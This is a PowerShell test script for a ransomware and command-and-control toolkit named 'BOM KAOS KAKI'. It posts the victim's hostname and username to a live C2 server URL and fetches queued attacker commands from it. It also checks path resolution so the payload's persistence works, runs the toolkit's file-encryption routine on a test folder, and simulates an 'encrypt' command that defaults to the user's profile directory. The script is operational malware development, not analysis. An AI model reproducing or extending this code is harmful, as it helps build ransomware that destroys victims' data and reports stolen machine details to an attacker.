$ErrorActionPreference = 'Continue'
$C2Url = "https://bom-kaos-kaki.vercel.app"

Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host " BOM KAOS KAKI - FULL DIAGNOSTIC" -ForegroundColor Cyan  
Write-Host "============================================`n" -ForegroundColor Cyan

# ============================
# TEST 1: Is agent running?
Write-Host "[1] Testing API Heartbeat..." -ForegroundColor Yellow
try {
    $h = @{ session_id = "DEBUG-$(Get-Random)"; hostname = $env:COMPUTERNAME; username = $env:USERNAME; timestamp = (Get-Date -Format 'o') } | ConvertTo-Json
    $r = Invoke-RestMethod "$C2Url/api/heartbeat" -Method POST -Body $h -ContentType "application/json"
    if ($r.success) { Write-Host "  -> HEARTBEAT OK" -ForegroundColor Green }
    else { Write-Host "  -> HEARTBEAT FAILED: $($r.error)" -ForegroundColor Red }
} catch { Write-Host "  -> HEARTBEAT ERROR: $($_.Exception.Message)" -ForegroundColor Red }

# ============================
# TEST 2: Get pending commands
Write-Host "`n[2] Checking pending commands for your session (2c684075)..." -ForegroundColor Yellow
try {
    $r = Invoke-RestMethod "$C2Url/api/get_commands?session_id=2c684075" -Method GET
    if ($r.commands -and $r.commands.Count -gt 0) {
        Write-Host "  -> COMMANDS PENDING: $($r.commands.Count)" -ForegroundColor Green
        foreach ($c in $r.commands) {
            Write-Host "     - [$($c.id)] type=$($c.command_type) params=$($c.parameters | ConvertTo-Json -Compress)" -ForegroundColor White
        }
    } else {
        Write-Host "  -> NO PENDING COMMANDS (Queue is empty)" -ForegroundColor DarkYellow
    }
} catch { Write-Host "  -> GET_COMMANDS ERROR: $($_.Exception.Message)" -ForegroundColor Red }

# ============================
# TEST 3: Check PSCommandPath
Write-Host "`n[3] Checking payload path resolution..." -ForegroundColor Yellow
$path1 = $PSCommandPath
$path2 = $MyInvocation.MyCommand.Path
$path3 = $MyInvocation.ScriptName
Write-Host "  -> PSCommandPath     = '$path1'" -ForegroundColor White
Write-Host "  -> MyCommand.Path    = '$path2'" -ForegroundColor White
Write-Host "  -> ScriptName        = '$path3'" -ForegroundColor White
$resolvedPath = if ($path1) { $path1 } elseif ($path2) { $path2 } elseif ($path3) { $path3 } else { $null }
if ($resolvedPath -and (Test-Path $resolvedPath)) {
    Write-Host "  -> RESOLVED: $resolvedPath (VALID)" -ForegroundColor Green
} else {
    Write-Host "  -> PATH RESOLUTION FAILED - Persistence will not work" -ForegroundColor Red
}

# ============================
# TEST 4: Test ransomware on a SAFE test folder
Write-Host "`n[4] Testing ransomware on test folder..." -ForegroundColor Yellow
$testDir = Join-Path $env:TEMP "BomTestRansom"
if (-not (Test-Path $testDir)) { New-Item -ItemType Directory -Path $testDir | Out-Null }
"Hello World Test File" | Set-Content "$testDir\test.txt"
"Another test" | Set-Content "$testDir\test2.txt"

Write-Host "  -> Created test files in $testDir" -ForegroundColor White

# Load the payload functions
try {
    . "c:\Users\Yudha\Downloads\BomKaosKaki.ps1" 2>$null
    $aesKey = New-AESKey
    $files = Invoke-RansomEncrypt -TargetDir $testDir -AESKeyBase64 $aesKey.Key -HMACKeyBase64 $aesKey.Key
    if ($files.Count -gt 0) {
        Write-Host "  -> RANSOMWARE WORKS! Encrypted $($files.Count) files" -ForegroundColor Green
        Write-Host "  -> Check $testDir for .bomkaos files" -ForegroundColor White
    } else {
        Write-Host "  -> RANSOMWARE ran but 0 files encrypted (check ExcludeDirs)" -ForegroundColor Red
    }
} catch { Write-Host "  -> RANSOMWARE ERROR: $_" -ForegroundColor Red }

# ============================
# TEST 5: Simulate what agent does with 'encrypt' command
Write-Host "`n[5] Simulating encrypt command dispatch..." -ForegroundColor Yellow
$fakeCmd = @{ command_type = "encrypt"; parameters = @{ TargetDirectory = $testDir }; id = "test-cmd-001" }
Write-Host "  -> command_type = $($fakeCmd.command_type)" -ForegroundColor White
Write-Host "  -> parameters   = $($fakeCmd.parameters | ConvertTo-Json -Compress)" -ForegroundColor White

$cmdName = $fakeCmd.command_type
$args = $fakeCmd.parameters
$targetDir2 = if ($args -and $args.TargetDirectory) { $args.TargetDirectory } elseif ($args -and ([string]$args -ne "")) { $args } else { $env:USERPROFILE }
Write-Host "  -> Resolved TargetDir = '$targetDir2'" -ForegroundColor $(if ($targetDir2 -eq $testDir) { 'Green' } else { 'Red' })

Write-Host "`n============================================" -ForegroundColor Cyan
Write-Host " DIAGNOSIS COMPLETE" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
